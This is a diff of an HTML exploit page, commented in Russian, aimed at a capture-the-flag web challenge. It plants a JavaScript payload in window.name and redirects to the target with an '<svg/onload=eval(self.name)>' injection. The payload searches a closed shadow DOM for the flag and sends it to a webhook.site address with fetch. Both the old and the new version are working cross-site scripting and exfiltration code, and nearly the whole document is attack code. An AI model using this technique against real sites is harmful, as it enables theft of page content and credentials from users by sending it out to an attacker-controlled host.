@@ -1,37 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Exploit Fix</title>
 </head>
 <body>
+    <h3>Redirecting to exploit...</h3>
     <script>
-        // 1. Записываем вредоносный код в имя окна (window.name)
-        // Этот код переживет переход на другую страницу.
-        // WAF задачи его не видит, так как он не в адресной строке.
+        // 1. Пейлоад.
+        // Обратите внимание: мы используем window.name для хранения кода.
         window.name = `
-            // Даем странице немного времени на загрузку (500мс)
-            setTimeout(function(){
-                // Используем window.find, чтобы найти скрытый текст в Shadow DOM
-                // Это уникальная фишка Chrome: поиск работает даже внутри closed shadow-root
+            try {
+                // Ищем текст флага
                 window.find('p_ctf');
                 
-                // Получаем выделенный текст
-                var sel = window.getSelection();
-                if (sel && sel.anchorNode) {
-                    var flag = sel.anchorNode.textContent;
-                    // Отправляем флаг на ваш вебхук
-                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?flag=' + encodeURIComponent(flag));
-                } else {
-                    // Если не нашли, отправляем ошибку (для отладки)
-                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=FlagNotFound');
-                }
-            }, 1000);
+                // Получаем выделение
+                var sel = window.getSelection().anchorNode.textContent;
+                
+                // Отправляем (добавил btoa для безопасности кодировки)
+                fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?flag=' + btoa(sel));
+            } catch(e) {
+                fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=' + e.message);
+            }
         `;
 
-        // 2. Сразу перенаправляем текущую страницу на уязвимую задачу.
-        // Браузер сохранит window.name при переходе.
-        // Payload: <svg/onload=eval(name)> — он короткий и вызывает код из window.name
-        window.location.href = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(name)%3E&avatar=https://picsum.photos/100";
+        // 2. Целевая ссылка.
+        // ВАЖНО: заменили eval(name) на eval(self.name)
+        // self.name всегда указывает на хранилище window.name
+        var target = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(self.name)%3E&avatar=https://picsum.photos/100";
+
+        // 3. Редирект
+        window.location.href = target;
     </script>
 </body>
 </html>
